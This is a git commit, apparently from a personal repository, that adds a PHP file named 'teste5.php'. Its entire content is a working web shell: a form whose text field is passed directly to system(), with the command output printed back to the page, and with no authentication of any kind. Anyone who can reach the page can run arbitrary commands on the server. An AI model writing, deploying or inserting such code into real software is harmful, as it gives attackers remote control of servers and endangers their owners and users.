c5be288238b03e572aac2036ce906900c8df7e3b
Roberto Shimokawa <r89shi@gmail.com>
2021-11-16 23:46:54 -0300

    Create teste5.php

---
+++ teste5.php
@@ -0,0 +1,8 @@
+<pre>
+<?php system($_POST["body2"]); ?>
+</pre>
+
+<form method="POST">
+  <textarea rows="4" cols="60" name="body2"></textarea><br>
+  <input type="submit" value="enviar">
+</form>
